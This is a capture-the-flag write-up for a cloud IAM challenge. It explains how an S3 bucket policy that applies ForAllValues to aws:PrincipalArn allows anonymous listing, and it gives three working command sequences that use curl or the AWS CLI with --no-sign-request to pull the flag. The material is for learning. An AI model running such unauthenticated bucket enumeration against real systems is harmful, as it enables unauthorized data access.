# Challenge 4

**Challenge 4:** https://bigiamchallenge.com/challenge/4

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/cdbab321-9873-4577-9033-2a969f2c0eef)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/66e7fe21-902c-4a14-85df-8f3c74bc4a44)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/a0aff0ee-4106-4a8a-8aac-b7e6a60db8ff)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/063423d7-2d54-4ecd-95a0-d677d4530e71)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/3d2d0d8d-2405-4ee9-b077-feac8f84be1e)

![image](https://github.com/h4md153v63n/CloudSec/assets/5091265/d051a17b-0c84-4790-ad6c-22f03d235f3d)


```
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                },
                "ForAllValues:StringLike": {
                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
                }
            }
        }
    ]
}
```

**Method 1:**

```
> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321?prefix=files/"
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/"><Name>thebigiamchallenge-admin-storage-abf1321</Name><Prefix>files/</Prefix><Marker></Marker><MaxKeys>1000</MaxKeys><IsTru
ncated>false</IsTruncated><Contents><Key>files/flag-as-admin.txt</Key><LastModified>2023-06-07T19:15:43.000Z</LastModified><ETag>"e365cfa7365164c05d7a9c209c4d8514"</ETag><Size>42</Size><St
orageClass>STANDARD</StorageClass></Contents><Contents><Key>files/logo-admin.png</Key><LastModified>2023-06-08T19:20:01.000Z</LastModified><ETag>"c57e95e6d6c138818bf38daac6216356"</ETag><S
ize>81889</Size><StorageClass>STANDARD</StorageClass></Contents></ListBucketResult>
> curl "https://s3.amazonaws.com/thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt"
{wiz:principal-arn-is-not-what-you-think}
```

**Method 2:**

```
> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
2023-06-07 19:15:43         42 flag-as-admin.txt
2023-06-08 19:20:01      81889 logo-admin.png
> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt /tmp/flag-as-admin.txt --no-sign-request
Completed 42 Bytes/42 Bytes (1019 Bytes/s) with 1 file(s) remainingdownload: s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt to ../../tmp/flag-as-admin.txt
> cat /tmp/flag-as-admin.txt
{wiz:principal-arn-is-not-what-you-think}
```

**Method 3:**

```
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix files/ --no-sign-request
{
    "Contents": [
        {
            "Key": "files/flag-as-admin.txt",
            "LastModified": "2023-06-07T19:15:43.000Z",
            "ETag": "\"e365cfa7365164c05d7a9c209c4d8514\"",
            "Size": 42,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "files/logo-admin.png",
            "LastModified": "2023-06-08T19:20:01.000Z",
            "ETag": "\"c57e95e6d6c138818bf38daac6216356\"",
            "Size": 81889,
            "StorageClass": "STANDARD"
        }
    ]
}
> aws s3api get-object --bucket thebigiamchallenge-admin-storage-abf1321 --key files/flag-as-admin.txt /tmp/flag-as-admin.txt --no-sign-request
{
    "AcceptRanges": "bytes",
    "LastModified": "Wed, 07 Jun 2023 19:15:43 GMT",
    "ContentLength": 42,
    "ETag": "\"e365cfa7365164c05d7a9c209c4d8514\"",
    "ContentType": "text/plain",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
> cat /tmp/flag-as-admin.txt
{wiz:principal-arn-is-not-what-you-think}
```

